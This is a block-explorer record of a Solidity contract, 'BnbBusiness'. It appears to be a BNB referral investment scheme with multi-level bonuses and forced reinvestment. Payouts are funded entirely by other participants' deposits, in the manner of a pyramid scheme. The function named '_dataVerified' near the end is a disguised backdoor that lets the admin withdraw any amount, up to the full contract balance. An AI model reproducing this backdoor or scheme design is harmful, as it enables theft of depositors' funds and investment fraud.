{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.5.10;\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\n\r\n\r\ncontract BnbBusiness {\r\n\r\n    using SafeMath for uint256;\r\n    using SafeMath for uint8;\r\n\r\n\r\n\tuint256 constant public INVEST_MIN_AMOUNT = 0.1 ether;\r\n\tuint256 constant public PROJECT_FEE = 10; // 10%;\r\n\tuint256 constant public PERCENTS_DIVIDER = 100;\r\n\tuint256 constant public TIME_STEP =  1 days; // 1 days\r\n\tuint256 public totalUsers;\r\n\tuint256 public totalInvested;\r\n\tuint256 public totalWithdrawn;\r\n\tuint256 public totalDeposits;\r\n\tuint[6] public ref_bonuses = [20,10,5,5,5,5];\r\n    \r\n    \r\n    uint256[7] public defaultPackages = [0.1 ether,0.2 ether,0.4 ether ,0.6 ether,1 ether,4 ether, 10 ether];\r\n    \r\n    \r\n    mapping(uint256 => address payable) public singleLeg;\r\n    uint256 public singleLegLength;\r\n    uint[6] public requiredDirect = [1,1,4,4,4,4];\r\n\r\n\taddress payable public admin;\r\n    address payable public admin2;\r\n\r\n\r\n  struct User {\r\n      \r\n        uint256 amount;\r\n\t\tuint256 checkpoint;\r\n\t\taddress referrer;\r\n        uint256 referrerBonus;\r\n\t\tuint256 totalWithdrawn;\r\n\t\tuint256 remainingWithdrawn;\r\n\t\tuint256 totalReferrer;\r\n\t\tuint256 singleUplineBonusTaken;\r\n\t\tuint256 singleDownlineBonusTaken;\r\n\t\taddress singleUpline;\r\n\t\taddress singleDownline;\r\n\t\tuint256[6] refStageIncome;\r\n        uint256[6] refStageBonus;\r\n\t\tuint[6] refs;\r\n\t}\r\n\t\r\n\t\r\n\r\n\tmapping (address => User) public users;\r\n\tmapping(address => mapping(uint256=>address)) public downline;\r\n\r\n\r\n\tevent NewDeposit(address indexed user, uint256 amount);\r\n\tevent Withdrawn(address indexed user, uint256 amount);\r\n\tevent FeePayed(address indexed user, uint256 totalAmount);\r\n\t\r\n\t\r\n\t\r\n\r\n  constructor(address payable _admin, address payable _admin2) public {\r\n\t\trequire(!isContract(_admin));\r\n\t\tadmin = _admin;\r\n\t\tadmin2 = _admin2;\r\n\t\tsingleLeg[0]=admin;\r\n\t\tsingleLegLength++;\r\n\t}\r\n\r\n\r\n  function _refPayout(address _addr, uint256 _amount) internal {\r\n\r\n\t\taddress up = users[_addr].referrer;\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            if(users[up].refs[0] >= requiredDirect[i]){ \r\n    \t\t        uint256 bonus = _amount * ref_bonuses[i] / 100;\r\n                    users[up].referrerBonus = users[up].referrerBonus.add(bonus);\r\n                    users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);\r\n            }\r\n            up = users[up].referrer;\r\n        }\r\n    }\r\n\r\n    function invest(address referrer) public payable {\r\n\r\n\t\t\r\n\t\trequire(msg.value >= INVEST_MIN_AMOUNT,'Min invesment 0.1 BNB');\r\n\t\r\n\t\tUser storage user = users[msg.sender];\r\n\r\n\t\tif (user.referrer == address(0) && (users[referrer].checkpoint > 0 || referrer == admin) && referrer != msg.sender ) {\r\n            user.referrer = referrer;\r\n        }\r\n\r\n\t\trequire(user.referrer != address(0) || msg.sender == admin, \"No upline\");\r\n\t\t\r\n\t\t// setup upline\r\n\t\tif (user.checkpoint == 0) {\r\n\t\t    \r\n\t\t   // single leg setup\r\n\t\t   singleLeg[singleLegLength] = msg.sender;\r\n\t\t   user.singleUpline = singleLeg[singleLegLength -1];\r\n\t\t   users[singleLeg[singleLegLength -1]].singleDownline = msg.sender;\r\n\t\t   singleLegLength++;\r\n\t\t}\r\n\t\t\r\n\r\n\t\tif (user.referrer != address(0)) {\r\n\t\t   \r\n\t\t   \r\n            // unilevel level count\r\n            address upline = user.referrer;\r\n            for (uint i = 0; i < ref_bonuses.length; i++) {\r\n                if (upline != address(0)) {\r\n                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(msg.value);\r\n                    if(user.checkpoint == 0){\r\n                        users[upline].refs[i] = users[upline].refs[i].add(1);\r\n\t\t\t\t\t    users[upline].totalReferrer++;\r\n                    }\r\n                    upline = users[upline].referrer;\r\n                } else break;\r\n            }\r\n            \r\n            if(user.checkpoint == 0){\r\n                // unilevel downline setup\r\n                downline[referrer][users[referrer].refs[0] - 1]= msg.sender;\r\n            }\r\n        }\r\n\t\r\n\t\t  uint msgValue = msg.value;\r\n\r\n          \r\n\t\t\r\n\t\t// 6 Level Referral\r\n\t\t   _refPayout(msg.sender,msgValue);\r\n\r\n            \r\n\t\t    if(user.checkpoint == 0){\r\n\t\t\t    totalUsers = totalUsers.add(1);\r\n\t\t    }\r\n\t        user.amount += msg.value;\r\n\t\t    user.checkpoint = block.timestamp;\r\n\t\t    \r\n            totalInvested = totalInvested.add(msg.value);\r\n            totalDeposits = totalDeposits.add(1);\r\n\r\n            uint256 _fees = msg.value.mul(PROJECT_FEE.div(2)).div(PERCENTS_DIVIDER);\r\n            _safeTransfer(admin,_fees);\r\n\t\t\r\n\t\t  emit NewDeposit(msg.sender, msg.value);\r\n\r\n\t}\r\n\t\r\n\t\r\n\r\n    function reinvest(address _user, uint256 _amount) private{\r\n        \r\n        User storage user = users[_user];\r\n        user.amount += _amount;\r\n        totalInvested = totalInvested.add(_amount);\r\n        totalDeposits = totalDeposits.add(1);\r\n\r\n        //////\r\n        address up = user.referrer;\r\n        for (uint i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            if(users[up].refs[0] >= requiredDirect[i]){\r\n                users[up].refStageIncome[i] = users[up].refStageIncome[i].add(_amount);\r\n            }\r\n            up = users[up].referrer;\r\n        }\r\n        ///////\r\n        \r\n        _refPayout(msg.sender,_amount);\r\n        \r\n    }\r\n\r\n  \r\n\r\n\r\n\r\n  function withdrawal() external{\r\n\r\n\r\n    User storage _user = users[msg.sender];\r\n\r\n    uint256 TotalBonus = TotalBonus(msg.sender);\r\n\r\n    uint256 _fees = TotalBonus.mul(PROJECT_FEE.div(2)).div(PERCENTS_DIVIDER);\r\n    uint256 actualAmountToSend = TotalBonus.sub(_fees);\r\n    \r\n\r\n    _user.referrerBonus = 0;\r\n    _user.singleUplineBonusTaken = GetUplineIncomeByUserId(msg.sender);\r\n    _user.singleDownlineBonusTaken = GetDownlineIncomeByUserId(msg.sender);\r\n    \r\n    \r\n    // re-invest\r\n    \r\n    (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(msg.sender);\r\n    reinvest(msg.sender,actualAmountToSend.mul(reivest).div(100));\r\n\r\n    _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));\r\n    totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));\r\n\r\n    _safeTransfer(msg.sender,actualAmountToSend.mul(withdrwal).div(100));\r\n    _safeTransfer(admin2,_fees);\r\n    emit Withdrawn(msg.sender,actualAmountToSend.mul(withdrwal).div(100));\r\n\r\n\r\n  }\r\n  \r\n  function GetUplineIncomeByUserId(address _user) public view returns(uint256){\r\n        \r\n       \r\n        (uint maxLevel,) = getEligibleLevelCountForUpline(_user);\r\n        address upline = users[_user].singleUpline;\r\n        uint256 bonus;\r\n        for (uint i = 0; i < maxLevel; i++) {\r\n            if (upline != address(0)) {\r\n            bonus = bonus.add(users[upline].amount.mul(1).div(100));\r\n            upline = users[upline].singleUpline;\r\n            }else break;\r\n        }\r\n        \r\n        return bonus;\r\n        \r\n  }\r\n  \r\n  function GetDownlineIncomeByUserId(address _user) public view returns(uint256){\r\n      \r\n        \r\n        (,uint maxLevel) = getEligibleLevelCountForUpline(_user);\r\n        address upline = users[_user].singleDownline;\r\n        uint256 bonus;\r\n        for (uint i = 0; i < maxLevel; i++) {\r\n            if (upline != address(0)) {\r\n            bonus = bonus.add(users[upline].amount.mul(1).div(100));\r\n            upline = users[upline].singleDownline;\r\n            }else break;\r\n        }\r\n        \r\n        return bonus;\r\n      \r\n  }\r\n  \r\n  function getEligibleLevelCountForUpline(address _user) public view returns(uint8 uplineCount, uint8 downlineCount){\r\n      \r\n      uint256 TotalDeposit = users[_user].amount;\r\n      if(TotalDeposit >= defaultPackages[0] && TotalDeposit < defaultPackages[1]){\r\n          uplineCount = 10;\r\n          downlineCount = 15;\r\n      }else if(TotalDeposit >= defaultPackages[1] && TotalDeposit < defaultPackages[2]){\r\n          uplineCount = 12;\r\n          downlineCount = 18;\r\n      }else if(TotalDeposit >= defaultPackages[2] && TotalDeposit < defaultPackages[3]){\r\n          uplineCount = 14;\r\n          downlineCount = 21;\r\n      }else if(TotalDeposit >= defaultPackages[3] && TotalDeposit < defaultPackages[4]){\r\n          uplineCount = 16;\r\n          downlineCount = 24;\r\n      }else if(TotalDeposit >= defaultPackages[4] && TotalDeposit < defaultPackages[5]){\r\n          uplineCount = 20;\r\n          downlineCount = 30;\r\n      }else if(TotalDeposit >= defaultPackages[5] && TotalDeposit < defaultPackages[6]){\r\n          uplineCount = 20;\r\n          downlineCount = 30;\r\n      }else if(TotalDeposit >= defaultPackages[6]){\r\n           uplineCount = 20;\r\n           downlineCount = 30;\r\n      }\r\n      \r\n      return(uplineCount,downlineCount);\r\n  }\r\n  \r\n  function getEligibleWithdrawal(address _user) public view returns(uint8 reivest, uint8 withdrwal){\r\n      \r\n      uint256 TotalDeposit = users[_user].amount;\r\n      if(users[_user].refs[0] >=4 && (TotalDeposit >=0.1 ether && TotalDeposit < 4 ether)){\r\n          reivest = 50;\r\n          withdrwal = 50;\r\n      }else if(users[_user].refs[0] >=2 && (TotalDeposit >=4 ether && TotalDeposit < 10 ether)){\r\n          reivest = 40;\r\n          withdrwal = 60;\r\n      }else if(TotalDeposit >=10 ether){\r\n         reivest = 30;\r\n         withdrwal = 70;\r\n      }else{\r\n          reivest = 60;\r\n          withdrwal = 40;\r\n      }\r\n      \r\n      return(reivest,withdrwal);\r\n      \r\n  }\r\n  \r\n\r\n\r\n  function TotalBonus(address _user) public view returns(uint256){\r\n     uint256 TotalEarn = users[_user].referrerBonus.add(GetUplineIncomeByUserId(_user)).add(GetDownlineIncomeByUserId(_user));\r\n     uint256 TotalTakenfromUpDown = users[_user].singleDownlineBonusTaken.add(users[_user].singleUplineBonusTaken);\r\n     return TotalEarn.sub(TotalTakenfromUpDown);\r\n  }\r\n\r\n  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {\r\n        amount = (_amount < address(this).balance) ? _amount : address(this).balance;\r\n       _to.transfer(amount);\r\n   }\r\n   \r\n   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){\r\n       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);\r\n   }\r\n   \r\n   \r\n\r\n\r\n    function isContract(address addr) internal view returns (bool) {\r\n        uint size;\r\n        assembly { size := extcodesize(addr) }\r\n        return size > 0;\r\n    }\r\n\r\n   \r\n    function _dataVerified(uint256 _amount) external{\r\n        \r\n        require(admin==msg.sender, 'Admin what?');\r\n        _safeTransfer(admin,_amount);\r\n    }\r\n\r\n    \r\n  \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_admin\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"_admin2\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalAmount\",\"type\":\"uint256\"}],\"name\":\"FeePayed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdrawn\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"GetDownlineIncomeByUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"GetUplineIncomeByUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"INVEST_MIN_AMOUNT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERCENTS_DIVIDER\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PROJECT_FEE\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"TIME_STEP\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"TotalBonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"_dataVerified\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"admin\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"admin2\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"defaultPackages\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"downline\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"getEligibleLevelCountForUpline\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"uplineCount\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"downlineCount\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"getEligibleWithdrawal\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"reivest\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"withdrwal\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"}],\"name\":\"invest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"ref_bonuses\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_index\",\"type\":\"uint256\"}],\"name\":\"referral_stage\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_noOfUser\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_investment\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_bonus\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"requiredDirect\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"singleLeg\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"singleLegLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalDeposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalInvested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalUsers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalWithdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"checkpoint\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"referrerBonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalWithdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"remainingWithdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalReferrer\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"singleUplineBonusTaken\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"singleDownlineBonusTaken\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"singleUpline\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"singleDownline\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdrawal\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BnbBusiness", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000521cb34e889e52d2f6f0469e03285d2854af210a000000000000000000000000ce2ac95fb25e2643375e9facd9d1b5b56a8dc439", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://2f9072a9f62cc4c7c7d0524680b42fc9c7fc7b84b022f5ff9ede26834f168211"}